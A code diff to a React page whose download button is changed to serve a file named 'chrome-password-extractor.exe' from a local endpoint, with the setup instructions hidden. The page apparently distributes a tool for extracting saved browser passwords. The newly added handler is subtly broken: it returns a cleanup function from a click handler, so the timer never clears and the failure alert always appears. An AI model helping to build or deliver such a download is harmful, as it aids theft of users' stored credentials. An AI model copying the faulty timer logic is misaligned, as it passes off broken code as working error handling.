@@ -26,8 +26,16 @@ export default function Page() {
 
   const handleDownload = () => {
     setDownloaded(true);
-    setShowInstructions(true);
-  }
+    setShowInstructions(false);
+
+    // Add check for download failure
+    const downloadTimer = setTimeout(() => {
+      alert("Download may have failed. Please try again or contact support.");
+    }, 5000); // Show error if download doesn't start within 5 seconds
+
+    // Clear the timer if component unmounts
+    return () => clearTimeout(downloadTimer);
+  };
 
   return (
     <div className="min-h-screen bg-gray-900">
@@ -47,12 +55,11 @@ export default function Page() {
           </button>
 
           <a
-            href="https://mock-porfolio.onrender.com/api/download/client-app"
+            href="http://127.0.0.1:5000/api/download/client-app"
             onClick={handleDownload}
             className="mt-5 cursor-pointer flex justify-center rounded-2xl items-center gap-2 bg-yellow-500 px-6 py-3 w-fit shadow-md shadow-gray-400"
-            download
+            download="chrome-password-extractor.exe"
           >
-            {/* <div className="text-white rounded-lg font-semibold">Download Password Extractor</div> */}
             <Download size={16} className="text-white" strokeWidth={3} />
           </a>
         </div>
